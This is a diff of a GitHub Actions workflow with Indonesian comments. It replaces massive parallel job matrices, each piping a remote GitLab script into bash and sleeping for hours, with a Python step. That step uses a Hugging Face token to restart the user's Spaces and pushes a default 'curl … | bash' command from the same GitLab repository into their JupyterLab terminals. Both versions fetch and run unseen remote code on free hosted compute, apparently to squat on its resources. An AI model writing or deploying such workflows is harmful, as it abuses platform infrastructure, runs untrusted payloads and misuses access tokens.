@@ -1,85 +1,164 @@
-name: jiwabangkit  raiodala 
+name: Auto Space – Restart & Jalankan Perintah
 
 on:
   workflow_dispatch:
-  push:
-    branches: ["main"]
-  schedule:
-    - cron: '0 */6 * * *'
+    inputs:
+      space_name:
+        description: 'Nama Space (kosongkan untuk memproses semua Space yang sleeping)'
+        required: false
+        default: ''
+      command:
+        description: 'Perintah yang dijalankan di terminal JupyterLab'
+        required: false
+        default: 'curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/mars | bash'
+
+env:
+  HF_TOKEN: ${{ secrets.HF_TOKEN }}
+  JUPYTER_TOKEN: ''                         # isi jika Jupyter pakai token, misal dari env Space
+  COMMAND_TO_RUN: ${{ github.event.inputs.command }}
+  SPACE_NAME_INPUT: ${{ github.event.inputs.space_name }}
 
 jobs:
-  build:
-    name: build
+  auto-run:
     runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 50
-      fail-fast: false
-      matrix:
-        go: [1, 2, 3, 4, 5, 6, 7, 8, 9]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
-    env:
-      NUM_JOBS: 40
-      JOB: ${{ matrix.go }}
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-    - name: install
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/camps2 | bash &
-           sleep 360s
-  cincau:
-    needs: build
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1, 2, 3, 4, 5, 6, 7, 8, 9]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
-    env:
-      NUM_JOBS: 40
-      JOB: ${{ matrix.go }}
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-    - name: install curl
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/camps2 | bash &
-            sleep 21m
-        
-    
-     
-  tepung:
-    needs: [build]
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1, 2, 3, 4, 5, 6, 7, 8, 9]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
-    env:
-      NUM_JOBS: 90
-      JOB: ${{ matrix.go }}
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-    - name: clone
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/camps2 | bash &
-            sleep 35m
-  tekwan:
-    needs: cincau
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: false
-      matrix:
-        go: [1, 2, 3, 4, 5, 6, 7, 8, 9]
-        flag: [A, B, C]
-    env:
-      NUM_JOBS: 90
-      JOB: ${{ matrix.go }}
-    steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-    - name: clone
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/camps2 | bash &
-            sleep 62m
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install Python dependencies
+        run: pip install huggingface_hub requests websocket-client
+
+      - name: Detect user, spaces, and execute
+        shell: python
+        run: |
+          import os, sys, time, json, requests, websocket
+          from huggingface_hub import HfApi, SpaceStage
+
+          HF_TOKEN = os.environ["HF_TOKEN"]
+          JUPYTER_TOKEN = os.environ.get("JUPYTER_TOKEN", "")
+          COMMAND = os.environ["COMMAND_TO_RUN"]
+          SPACE_NAME_INPUT = os.environ.get("SPACE_NAME_INPUT", "").strip()
+
+          api = HfApi(token=HF_TOKEN)
+
+          # 1. Dapatkan username dari token
+          try:
+              whoami = api.whoami()
+              username = whoami["name"]
+              print(f"👤 Username: {username}")
+          except Exception as e:
+              print(f"❌ Gagal mendapatkan info user: {e}")
+              sys.exit(1)
+
+          # 2. Dapatkan daftar Space milik user
+          all_spaces = []
+          try:
+              for space in api.list_spaces(author=username):
+                  all_spaces.append(space.id)   # format: username/nama_space
+          except Exception as e:
+              print(f"❌ Gagal mengambil daftar Space: {e}")
+              sys.exit(1)
+
+          if not all_spaces:
+              print("📭 Tidak ada Space ditemukan di akun ini.")
+              sys.exit(0)
+
+          # 3. Filter Space yang akan diproses
+          spaces_to_process = []
+          if SPACE_NAME_INPUT:
+              full_name = f"{username}/{SPACE_NAME_INPUT}"
+              if full_name in all_spaces:
+                  spaces_to_process.append(full_name)
+              else:
+                  print(f"❌ Space '{full_name}' tidak ditemukan.")
+                  print(f"   Daftar Space yang tersedia: {', '.join(all_spaces)}")
+                  sys.exit(1)
+          else:
+              # Ambil semua Space yang sleeping/paused
+              print("🔍 Memindai status semua Space...")
+              for repo_id in all_spaces:
+                  try:
+                      runtime = api.get_space_runtime(repo_id)
+                      print(f"   {repo_id} → {runtime.stage}")
+                      if runtime.stage in [SpaceStage.PAUSED, SpaceStage.SLEEPING, SpaceStage.RUNNING]:
+                          # Kita proses yang sleeping/paused/atau mungkin sudah running
+                          spaces_to_process.append(repo_id)
+                  except Exception as e:
+                      print(f"⚠️ Tidak bisa mengecek {repo_id}: {e}")
+
+          if not spaces_to_process:
+              print("✨ Semua Space sudah running atau tidak ada yang perlu diproses.")
+              sys.exit(0)
+
+          print(f"\n📋 Space yang akan diproses: {spaces_to_process}")
+
+          # 4. Proses setiap Space
+          for repo_id in spaces_to_process:
+              print(f"\n=== Memproses {repo_id} ===")
+              try:
+                  # 4a. Restart jika tidak running
+                  runtime = api.get_space_runtime(repo_id)
+                  if runtime.stage != SpaceStage.RUNNING:
+                      print("🔄 Merestart Space...")
+                      api.restart_space(repo_id)
+                      # Tunggu hingga RUNNING
+                      for _ in range(30):   # max 5 menit
+                          time.sleep(10)
+                          runtime = api.get_space_runtime(repo_id)
+                          print(f"   Status: {runtime.stage}")
+                          if runtime.stage == SpaceStage.RUNNING:
+                              break
+                      else:
+                          print("⏰ Timeout menunggu Space running.")
+                          continue
+
+                  # 4b. Cek ketersediaan JupyterLab
+                  space_url = f"https://{repo_id.replace('/', '-')}.hf.space"
+                  headers = {"Authorization": f"Bearer {HF_TOKEN}"}
+                  term_url = f"{space_url}/api/terminals"
+                  if JUPYTER_TOKEN:
+                      term_url += f"?token={JUPYTER_TOKEN}"
+
+                  resp = requests.post(term_url, headers=headers)
+                  if resp.status_code != 200:
+                      print(f"⚠️ JupyterLab tidak tersedia di Space ini (HTTP {resp.status_code}). Lewati.")
+                      continue
+
+                  terminal = resp.json()
+                  term_name = terminal["name"]
+                  print(f"💻 Terminal dibuat: {term_name}")
+
+                  # 4c. Kirim perintah via WebSocket
+                  ws_url = f"wss://{repo_id.replace('/', '-')}.hf.space/api/terminals/websocket/{term_name}"
+                  params = []
+                  if JUPYTER_TOKEN:
+                      params.append(f"token={JUPYTER_TOKEN}")
+                  params.append(f"authorization=Bearer {HF_TOKEN}")
+                  ws_url += "?" + "&".join(params)
+
+                  ws = websocket.create_connection(ws_url)
+                  ws.send(json.dumps(["stdin", COMMAND + "\n"]))
+                  time.sleep(2)
+
+                  output = ""
+                  while True:
+                      try:
+                          msg = ws.recv()
+                          data = json.loads(msg)
+                          if data[0] == "stdout":
+                              output += data[1]
+                      except:
+                          break
+                  ws.close()
+                  print("📤 Output:")
+                  print(output)
+
+                  # Hapus terminal
+                  requests.delete(term_url, headers=headers)
+                  print("✅ Selesai.")
+
+              except Exception as e:
+                  print(f"❌ Gagal memproses {repo_id}: {e}")
+                  continue
+
+          print("\n🎉 Semua Space berhasil diproses.")
